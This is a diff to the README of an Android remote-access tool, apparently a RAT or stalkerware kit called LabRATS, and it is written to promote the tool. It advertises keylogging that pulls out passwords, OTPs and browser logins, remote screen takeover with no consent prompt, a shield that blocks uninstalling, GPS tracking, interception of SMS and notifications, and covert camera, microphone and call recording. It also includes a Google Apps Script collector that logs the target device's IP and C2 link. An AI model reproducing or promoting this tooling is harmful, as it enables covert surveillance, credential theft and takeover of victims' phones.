@@ -39,18 +39,20 @@
 ## 🚀 The Fun Stuff (Remote Capabilities)
 
 -   👻 **Ghost Controller (Gold Standard)**:
-    -   **Live Keylogging (v1.4 Update)**: Intercept **keystrokes and system text in real-time**. Now features **Sensitive Info Highlighting** (Passcodes, OTPs, Emails glow Red) and **Deep Extraction** for browser logins.
-    -   **📱 Ghost Screen Control/Mirror**: Cast the **live screen** and **control** the **device remotely** with **NO "Consent Prompt"** required.
--   💀  **Anti-Removal Shield (Optimized)**: High-speed, event-driven protection that **blocks attempts** to **Uninstall or Force Stop** the app.
+    -   **Live Keylogging (v1.4 Update)**: Intercept **keystrokes and system text in real-time**. Now features **Sensitive Info Highlighting** *(Passcodes, OTPs, Emails glow Red)* and **Deep Extraction** for browser logins.
+    -   **📱 Ghost Screen Control/Mirror**: Cast the **live screen** and **control** the **device remotely** with **NO "Consent Prompt"** required. *(Essentially full remote takeover, pair with Blackout Mode for max stealth)*
+-   💀  **Anti-Removal Shield (Optimized)**: High-speed, event-driven protection that **blocks attempts** to **Uninstall or Force Stop** the app. *(Kicks user to homescreen & will not allow entry to the app settings)*
 -   🛰️  **Precision GPS Tracking**: One-click uplink to open the **target's exact real-time location** in **Google Maps**.
--   ⚡   **Intel Stream (Notification Sniffer)**: Intercept **every notification** (*WhatsApp, Telegram, RCS, System*) in a live feed. **NEW**: Automatically highlights and badges sensitive data like OTPs and Bank alerts.
+-   ⚡   **Intel Stream (Notification Sniffer)**: Intercept **every notification** (*WhatsApp, Telegram, RCS, System*) in a live feed. **NEW**: Automatically highlights and badges **sensitive data like OTPs and Bank alerts**.
 -   🖼️ **MMS Terminal (Game Changer!)**:
     -   **Browse & Extract**: Download and view **ANY Multimedia Message (MMS)**. **v1.4 Update**: Fixed large video playback and streaming support.
     -   **Remote Dispatch**: Send **MMS/Picture Messages** directly from the target phone.
 -   💬 **SMS Command Center**: Full interception and remote texting from the target's number.
--   📸 **Tactical Surveillance Hub**: 
+-   📸 **Tactical Surveillance Hub**:
     -   **Live Camera Streaming**: View **high-speed video** from **both front** and **back cameras**.
     -   **Covert Recording**: **Stealthily record** video without any user-facing activity.
+    -   **Snap Photos**: **Covert image capture** integrated into live stream.
+    -   **Nightmode**: **Brightens live stream/photos** taken in **low-light environments** without the flash.
 -   🎙️ **Acoustics & Interception**: Live **microphone recording** and automated **call recording** for both incoming and outgoing calls.
 -   📞 **Remote Dialer**: Initiate **phone calls directly from the C2 panel** using the target's SIM card.
 -   📂 **Advanced Data Uplink**:
@@ -93,7 +95,7 @@
 3.  The **Server** will go online and the **Active interface Web IP Link** should **pop up instantly** on your **Google Sheet**. *(Example Google Sheet Below)*
 4.  **Thats it**! Now you can use **ALL the remote features from anywhere in the world** as long as the **App Server is running on the Target/Test device**.
 
-> Info - *To use the Ghost features you must navigate to the "Ghost Tab" in the Web Control(C2) Panel and click the "Open Accessibility Settings" button. This opens a page on the device, tap "Installed Apps" and grant access to full control of device. - Images Below* ** *(This only applies to the "Ghost Remote Control", "Ghost Utilities", and "Ghost Keylogs". All other features can be used without this permission)*
+> Info - *To use the Ghost features navigate to the "Ghost Tab" in the Web Control(C2) Panel and click the "Open Accessibility Settings" button. This opens a page on the device, tap "Installed Apps" and grant access to full control of device. - Images Below* ** *(This only applies to the "Ghost Remote Control", "Ghost Utilities", and "Ghost Keylogs". All other features can be used without this permission)*
 
 [![Accessibilities-Perm.png](https://i.postimg.cc/Z510fCkq/Accessibilities-Perm.png)](https://postimg.cc/CRsF5Mxy)
 
@@ -113,7 +115,18 @@ function doPost(e) {
     var ss = SpreadsheetApp.getActiveSpreadsheet();
     var sheet = ss.getSheetByName("LabRATS Logs") || ss.getSheets()[0];
     var data = JSON.parse(e.postData.contents);
-    var rowData = [new Date(), data.device, data.network, data.ip, data.port, data.link, data.battery, data.stealth ? "ACTIVE" : "OFF"];
+    
+    var rowData = [
+      new Date(),       // A: Date & Time
+      data.device,     // B: Device Model #
+      data.network,    // C: Connection Type
+      data.ip,         // D: IP Address
+      data.port,       // E: Port #
+      data.link,       // F: Active Web Server URL Link
+      data.battery,    // G: Battery
+      data.stealth ? "ACTIVE" : "OFF" // H: Stealth Status
+    ];
+    
     sheet.appendRow(rowData);
     return ContentService.createTextOutput("SUCCESS").setMimeType(ContentService.MimeType.TEXT);
   } catch (err) {
@@ -122,9 +135,9 @@ function doPost(e) {
 }
 ```
 3.  **Deploy** → **Web App** → **Execute as Me** → **Access Anyone**.
-4.  **Paste** the **generated URL** into the **APK Builder** when prompted.
+4.  **Paste** the **Generated URL** into the **APK Builder** when prompted.
 
-### 📊 Example Google Sheet Running and Properly Configured:
+### 📊 Example Google Sheet Running:
 
 [![Google-Sheet-Example.png](https://i.postimg.cc/L6qYMSZr/Google-Sheet-Example.png)](https://postimg.cc/56VNwZg3)
 
@@ -175,13 +188,13 @@ bc1q6lmkuju3kf7f8624fwt5qs7k5mf63mekgcnzf4
 
 ### **C2 Panel Video Clip:**
 
-https://github.com/user-attachments/assets/20bd6663-0b6b-4fc7-86b2-973d97763f66
+https://github.com/user-attachments/assets/5d8f33c7-f4a6-4df5-ab55-69e317ca7874
 
 ---
 
 ### **Terminal/Homepage Tab:**
 
-[![01-Terminal-Tab.png](https://i.postimg.cc/1zpTZ03K/01-Terminal-Tab.png)](https://postimg.cc/rdwg1rWd)
+[![01-Terminal-Tab.png](https://i.postimg.cc/jjwCKz5t/01-Terminal-Tab.png)](https://postimg.cc/McwzmfVF)
 
 ---
 
@@ -193,11 +206,15 @@ https://github.com/user-attachments/assets/20bd6663-0b6b-4fc7-86b2-973d97763f66
 
 ### **Ghost Ops.Tab Remote/Stealth:** *(Bottom half)*
 
-[![03-Ghost-Tab-Bottom.png](https://i.postimg.cc/4yCQ4q2f/03-Ghost-Tab-Bottom.png)](https://postimg.cc/mzwH8XGJ)
+<p align="center">
+  <a href="https://postimg.cc/mzwH8XGJ">
+    <img src="https://i.postimg.cc/4yCQ4q2f/03-Ghost-Tab-Bottom.png" alt="03-Ghost-Tab-Bottom.png" />
+  </a>
+</p>
 
 ---
 
-### **Optics/Camera Tab:**
+### **Optics/Live Camera Stream Tab:**
 
 [![04-Optics-Tab.png](https://i.postimg.cc/W3Z0ySpq/04-Optics-Tab.png)](https://postimg.cc/R6M367Hv)
 
@@ -205,7 +222,7 @@ https://github.com/user-attachments/assets/20bd6663-0b6b-4fc7-86b2-973d97763f66
 
 ### **Live Camera Stream Example:**
 
-[![05-Live-Cam-stream.png](https://i.postimg.cc/ZRPC3QKH/05-Live-Cam-stream.png)](https://postimg.cc/xJCfVtmN)
+[![05-Live-Cam-Stream.png](https://i.postimg.cc/x8Dh4Skw/05-Live-Cam-Stream.png)](https://postimg.cc/phCsm4JC)
 
 ---
 
